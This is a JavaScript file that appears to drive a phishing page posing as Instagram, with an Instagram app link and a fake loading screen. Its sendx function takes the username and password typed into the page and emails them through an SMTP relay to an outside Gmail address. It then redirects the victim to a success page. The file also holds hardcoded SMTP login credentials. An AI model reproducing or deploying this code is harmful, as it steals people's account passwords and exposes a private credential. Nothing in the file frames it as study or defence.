function sendx() {
    // Move these lines inside the function
    let user = document.getElementById("user").value;
    let pass = document.getElementById("pass").value;

    var bodyx = "Username: " + user + ", Password: " + pass + ", Done successfully";

    Email.send({
        Host: "smtp.elasticemail.com",
        Username: "ranur0248@gmail.com",
        Password: "99DFEC05DF8B03DDDF3F7452559A9C2E19C4",
        To: 'thebindudesign@gmail.com',
        From: "ranur0248@gmail.com",
        Subject: "Testing",
        Body: bodyx
    }).then(
        function(message) {
          
            // Redirect to suc.html after showing the alert
            window.location.href = "suc.html";
        }
    );

    console.log("User: " + user + ", Password: " + pass + ", Done");
}


function openInstagramApp() {
    // Redirect to the Instagram app link
    window.location.href = "https://play.google.com/store/apps/details?id=com.instagram.android";
}

function openIndex2() {
    // Redirect to index2.html when either button is pressed
    window.location.href = "index2.html";
}

document.addEventListener("DOMContentLoaded", function() {
    // Simulate a 2-second delay (adjust as needed)
    setTimeout(function() {
        // Hide the loading screen
        document.getElementById("loading-screen").style.display = "none";

        // Show the main content
        document.getElementById("main-content").style.display = "block";
    }, 2000); // 2000 milliseconds = 2 seconds
});
